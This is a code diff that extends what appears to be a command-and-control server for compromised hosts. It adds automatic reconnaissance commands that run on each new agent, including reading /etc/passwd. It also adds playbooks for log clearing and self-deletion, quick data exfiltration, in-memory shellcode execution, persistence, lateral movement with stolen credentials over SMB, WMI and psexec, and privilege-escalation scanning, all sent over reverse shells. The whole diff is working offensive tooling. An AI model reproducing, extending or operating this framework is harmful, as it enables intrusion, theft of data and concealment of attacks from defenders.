@@ -81,6 +81,8 @@ class TaskType(str, Enum):
     PERSIST      = "persist"       # Establish persistence
     EXFIL        = "exfil"         # Data exfiltration
     ANTIFORENSIC = "antiforensic"  # Anti-forensics
+    KILL         = "kill"          # Wipe beacon from disk
+    MEM_EXEC     = "mem_exec"      # Execute shellcode/binary in-memory
 
 
 # ---------------------------------------------------------------------------
@@ -224,6 +226,43 @@ class C2Infrastructure:
     WORKER_INTERVAL: float = 2.0
     # Maximum tasks kept in completed history
     MAX_TASK_HISTORY: int  = 500
+    
+    AUTO_SURVEY_ENABLED: bool = True
+    AUTO_SURVEY_COMMANDS: Dict[str, List[str]] = {
+        "windows": [
+            "whoami /all",
+            "systeminfo",
+            "ipconfig /all",
+            "netstat -ano",
+            "net user",
+            "tasklist /v"
+        ],
+        "linux": [
+            "whoami",
+            "uname -a",
+            "ifconfig -a || ip addr",
+            "netstat -tpln || ss -tpln",
+            "cat /etc/passwd",
+            "ps aux"
+        ]
+    }
+
+    DEFAULT_PLAYBOOKS: Dict[str, List[Dict[str, Any]]] = {
+        "🔍 Full Reconnaissance": [
+            {"type": TaskType.SHELL_CMD, "payload": {"command": "whoami /all"}},
+            {"type": TaskType.SYSINFO,    "payload": {}},
+            {"type": TaskType.SCAN,       "payload": {"target": "local"}}
+        ],
+        "👻 Ghost Cleanup & Exit": [
+            {"type": TaskType.ANTIFORENSIC, "payload": {"method": "clear_logs"}},
+            {"type": TaskType.ANTIFORENSIC, "payload": {"method": "delete_artifacts"}},
+            {"type": TaskType.KILL,         "payload": {}}
+        ],
+        "📦 Quick Data Exfil": [
+            {"type": TaskType.SHELL_CMD, "payload": {"command": "dir %USERPROFILE%\\Documents /s"}},
+            {"type": TaskType.FILE_GET,  "payload": {"command": "C:\\Windows\\System32\\drivers\\etc\\hosts"}}
+        ]
+    }
 
     def __init__(self) -> None:
         # Sub-systems
@@ -369,6 +408,11 @@ class C2Infrastructure:
                 "Agent registered: %s @ %s (%s / %s)",
                 agent_id, ip, hostname, os_info,
             )
+            
+            # Trigger Auto-Survey if enabled
+            if self.AUTO_SURVEY_ENABLED:
+                self._trigger_auto_survey(agent)
+                
             return agent
 
     def unregister_agent(self, agent_id: str) -> Tuple[bool, str]:
@@ -404,6 +448,16 @@ class C2Infrastructure:
                 for a in self._agents.values()
                 if a.status in (AgentStatus.ACTIVE, AgentStatus.TASKED, AgentStatus.IDLE)
             ]
+
+    def _trigger_auto_survey(self, agent: Agent) -> None:
+        """Queue a series of discovery tasks for a newly registered agent."""
+        os_type = "windows" if "windows" in agent.os_info.lower() else "linux"
+        commands = self.AUTO_SURVEY_COMMANDS.get(os_type, [])
+        
+        self.logger.info("Triggering auto-survey for agent %s (%s)", agent.agent_id, os_type)
+        for cmd in commands:
+            # We don't use the lock here as queue_task handles its own locking
+            self.queue_task(agent.agent_id, TaskType.SHELL_CMD, payload={"command": cmd})
 
     def tag_agent(self, agent_id: str, tag: str) -> Tuple[bool, str]:
         """Attach a free-form label to an agent for campaign grouping."""
@@ -667,6 +721,135 @@ class C2Infrastructure:
         )
         return ok, msg, task.task_id if task else None
 
+    def kill_agent(self, agent_id: str) -> Tuple[bool, str, Optional[str]]:
+        """Queue a KILL task to instruct the agent to delete itself from disk."""
+        ok, msg, task = self.queue_task(
+            agent_id=agent_id,
+            task_type=TaskType.KILL,
+            payload=None,
+        )
+        if ok and task:
+            # Mark the agent as dead in advance so we don't expect further heartbeats
+            with self._lock:
+                agent = self._agents.get(agent_id)
+                if agent:
+                    agent.status = AgentStatus.DEAD
+            self.logger.warning(f"KILL task queued for agent {agent_id}. Agent marked as DEAD.")
+        return ok, msg, task.task_id if task else None
+
+    def establish_persistence(self, agent_id: str, method: str, options: dict = None) -> Tuple[bool, str, Optional[str]]:
+        """Queue a PERSIST task to establish persistence on the agent."""
+        with self._lock:
+            agent = self._agents.get(agent_id)
+            if not agent:
+                return False, f"Agent {agent_id} not found", None
+            
+        ok, msg, task = self.queue_task(
+            agent_id=agent_id,
+            task_type=TaskType.PERSIST,
+            payload={"method": method, "options": options or {}},
+        )
+        return ok, msg, task.task_id if task else None
+
+    def exfiltrate_file(self, agent_id: str, remote_path: str) -> Tuple[bool, str, Optional[str]]:
+        """Queue a FILE_GET task to pull a file from the agent."""
+        with self._lock:
+            agent = self._agents.get(agent_id)
+            if not agent:
+                return False, f"Agent {agent_id} not found", None
+            
+        ok, msg, task = self.queue_task(
+            agent_id=agent_id,
+            task_type=TaskType.FILE_GET,
+            payload={"command": remote_path},
+        )
+        return ok, msg, task.task_id if task else None
+
+    def reflective_load(self, agent_id: str, sc_base64: str) -> Tuple[bool, str, Optional[str]]:
+        """Queue a task to execute shellcode or a binary in-memory."""
+        with self._lock:
+            agent = self._agents.get(agent_id)
+            if not agent:
+                return False, f"Agent {agent_id} not found", None
+            
+        ok, msg, task = self.queue_task(
+            agent_id=agent_id,
+            task_type=TaskType.MEM_EXEC,
+            payload={"command": sc_base64},
+        )
+        return ok, msg, task.task_id if task else None
+
+    def run_playbook(self, agent_id: str, playbook_name: str) -> Tuple[bool, str]:
+        """Execute a predefined sequence of tasks for an agent."""
+        with self._lock:
+            if playbook_name not in self.DEFAULT_PLAYBOOKS:
+                return False, f"Playbook '{playbook_name}' not found"
+            
+            agent = self._agents.get(agent_id)
+            if not agent:
+                return False, f"Agent {agent_id} not found"
+                
+        tasks = self.DEFAULT_PLAYBOOKS[playbook_name]
+        self.logger.info("Launching playbook '%s' for agent %s", playbook_name, agent_id)
+        
+        for t in tasks:
+            self.queue_task(
+                agent_id=agent_id,
+                task_type=t["type"],
+                payload=t.get("payload")
+            )
+            
+        return True, f"Playbook '{playbook_name}' queued ({len(tasks)} tasks)"
+
+    def lateral_movement_exec(self, agent_id: str, method: str, target: str, 
+                             username: str, password: str, command: str = None) -> Tuple[bool, str, Optional[str]]:
+        """Queue a LATERAL task to move to a new host."""
+        with self._lock:
+            agent = self._agents.get(agent_id)
+            if not agent:
+                return False, f"Agent {agent_id} not found", None
+            
+        ok, msg, task = self.queue_task(
+            agent_id=agent_id,
+            task_type=TaskType.LATERAL,
+            payload={
+                "method": method, 
+                "target": target,
+                "username": username,
+                "password": password,
+                "command": command
+            },
+        )
+        return ok, msg, task.task_id if task else None
+
+    def scan_for_escalation(self, agent_id: str) -> Tuple[bool, str, Optional[str]]:
+        """Queue an ESCALATE task to find privilege escalation vectors."""
+        with self._lock:
+            agent = self._agents.get(agent_id)
+            if not agent:
+                return False, f"Agent {agent_id} not found", None
+            
+        ok, msg, task = self.queue_task(
+            agent_id=agent_id,
+            task_type=TaskType.ESCALATE,
+            payload={},
+        )
+        return ok, msg, task.task_id if task else None
+
+    def anti_forensics_exec(self, agent_id: str, method: str, options: Dict = None) -> Tuple[bool, str, Optional[str]]:
+        """Queue an ANTIFORENSIC task to cover tracks."""
+        with self._lock:
+            agent = self._agents.get(agent_id)
+            if not agent:
+                return False, f"Agent {agent_id} not found", None
+            
+        ok, msg, task = self.queue_task(
+            agent_id=agent_id,
+            task_type=TaskType.ANTIFORENSIC,
+            payload={"method": method, "options": options or {}},
+        )
+        return ok, msg, task.task_id if task else None
+
     # ------------------------------------------------------------------
     # Campaign management
     # ------------------------------------------------------------------
@@ -901,6 +1084,27 @@ class C2Infrastructure:
             elif task.task_type == TaskType.START_PROXY:
                 self._exec_start_proxy(agent, task)
 
+            elif task.task_type == TaskType.KILL:
+                self._exec_kill(agent, task)
+
+            elif task.task_type == TaskType.PERSIST:
+                self._exec_persist(agent, task)
+
+            elif task.task_type == TaskType.FILE_GET:
+                self._exec_file_get(agent, task)
+
+            elif task.task_type == TaskType.LATERAL:
+                self._exec_lateral(agent, task)
+
+            elif task.task_type == TaskType.ESCALATE:
+                self._exec_escalate(agent, task)
+
+            elif task.task_type == TaskType.ANTIFORENSIC:
+                self._exec_anti_forensics(agent, task)
+
+            elif task.task_type == TaskType.MEM_EXEC:
+                self._exec_mem_exec(agent, task)
+
             else:
                 self.complete_task(task.task_id, error=f"Unsupported task type: {task.task_type}")
 
@@ -984,6 +1188,146 @@ class C2Infrastructure:
             )
         else:
             self.complete_task(task.task_id, error=msg)
+
+    def _exec_kill(self, agent: Agent, task: Task) -> None:
+        """Send the special KILL command to the beacon."""
+        ok, msg = self.reverse_shell.execute_command(agent.conn_id, "kill", task_type="kill")
+        if ok:
+            agent.touch()
+            self.complete_task(task.task_id, result={"command": "kill", "status": "sent"})
+        else:
+            self.complete_task(task.task_id, error=msg)
+
+    def _exec_mem_exec(self, agent: Agent, task: Task) -> None:
+        """Send shellcode/binary to the beacon for in-memory execution."""
+        payload = task.payload or {}
+        sc_data = payload.get("command", "")
+        
+        if not sc_data:
+            self.complete_task(task.task_id, error="No data provided for mem_exec")
+            return
+            
+        ok, msg = self.reverse_shell.execute_command(
+            agent.conn_id, 
+            sc_data, 
+            task_type="mem_exec"
+        )
+        if ok:
+            agent.touch()
+        else:
+            self.complete_task(task.task_id, error=msg)
+
+    def _exec_persist(self, agent: Agent, task: Task) -> None:
+        """Route the persistence request to the PersistenceMechanisms module."""
+        payload = task.payload or {}
+        method = payload.get("method")
+        options = payload.get("options", {})
+        
+        # Determine OS from agent info
+        os_type = "windows" if "windows" in agent.os_info.lower() else "linux"
+        
+        success, cmd_or_msg = self.persistence.establish_persistence(os_type, agent.agent_id, method, options)
+        
+        if success:
+            # If it returned a command, we send it as a shell command
+            if cmd_or_msg.startswith(('reg', 'sc', 'schtasks', 'echo', 'powershell', '(')):
+                ok, msg = self.reverse_shell.execute_command(agent.conn_id, cmd_or_msg)
+                if ok:
+                    agent.touch()
+                    self.complete_task(task.task_id, result={"method": method, "command": cmd_or_msg, "status": "sent"})
+                else:
+                    self.complete_task(task.task_id, error=msg)
+            else:
+                self.complete_task(task.task_id, result={"method": method, "message": cmd_or_msg})
+        else:
+            self.complete_task(task.task_id, error=cmd_or_msg)
+
+    def _exec_file_get(self, agent: Agent, task: Task) -> None:
+        """Request a file from the agent."""
+        payload = task.payload or {}
+        remote_path = payload.get("command")
+        
+        ok, msg = self.reverse_shell.execute_command(
+            agent.conn_id, 
+            remote_path, 
+            task_type="file_get"
+        )
+        if not ok:
+            self.complete_task(task.task_id, error=msg)
+        else:
+            agent.touch()
+
+    def _exec_lateral(self, agent: Agent, task: Task) -> None:
+        """Route lateral movement request."""
+        payload = task.payload or {}
+        method = payload.get("method")
+        target = payload.get("target")
+        username = payload.get("username")
+        password = payload.get("password")
+        command = payload.get("command") or "whoami"
+        
+        if method == "smb":
+            success, cmd = self.lateral_movement.smb_exec(target, username, password)
+        elif method == "wmi":
+            success, cmd = self.lateral_movement.wmi_exec(target, username, password, command)
+        elif method == "psexec":
+            success, cmd = self.lateral_movement.psexec_style(target, username, password, command)
+        else:
+            self.complete_task(task.task_id, error=f"Unsupported lateral method: {method}")
+            return
+
+        if success:
+            ok, msg = self.reverse_shell.execute_command(agent.conn_id, cmd)
+            if ok:
+                agent.touch()
+                self.complete_task(task.task_id, result={"method": method, "target": target, "status": "sent"})
+            else:
+                self.complete_task(task.task_id, error=msg)
+        else:
+            self.complete_task(task.task_id, error=cmd)
+
+    def _exec_escalate(self, agent: Agent, task: Task) -> None:
+        """Run privilege escalation checks."""
+        os_type = "windows" if "windows" in agent.os_info.lower() else "linux"
+        results = self.priv_esc.check_escalation_vectors(os_type, agent.agent_id)
+        
+        # We need to run each command found
+        combined_output = "Scanning for escalation vectors...\n"
+        for name, data in results.items():
+            if isinstance(data, dict) and "command" in data:
+                cmd = data["command"]
+                ok, msg = self.reverse_shell.execute_command(agent.conn_id, cmd)
+                if ok:
+                    combined_output += f"[+] Task queued for: {name}\n"
+                else:
+                    combined_output += f"[-] Failed to queue: {name} ({msg})\n"
+        
+        agent.touch()
+        self.complete_task(task.task_id, result={"summary": combined_output})
+
+    def _exec_anti_forensics(self, agent: Agent, task: Task) -> None:
+        """Cover tracks and clean artifacts."""
+        payload = task.payload or {}
+        method  = payload.get("method")
+        options = payload.get("options", {})
+        
+        os_type = "windows" if "windows" in agent.os_info.lower() else "linux"
+        success, cmd_or_msg = self.anti_forensics.cover_tracks(os_type, agent.agent_id, method, options)
+        
+        if success:
+            if cmd_or_msg == "TRIGGER_KILL_SEQUENCE":
+                # Special case: anti-forensic memory wiping triggers the kill sequence
+                ok, msg = self.reverse_shell.execute_command(agent.conn_id, "kill", task_type="kill")
+            else:
+                ok, msg = self.reverse_shell.execute_command(agent.conn_id, cmd_or_msg)
+            
+            if ok:
+                agent.touch()
+                self.complete_task(task.task_id, result={"method": method, "status": "sent"})
+            else:
+                self.complete_task(task.task_id, error=msg)
+        else:
+            self.complete_task(task.task_id, error=cmd_or_msg)
 
     def _evict_dead_agents(self) -> None:
         """Mark agents that have been silent too long as DEAD."""
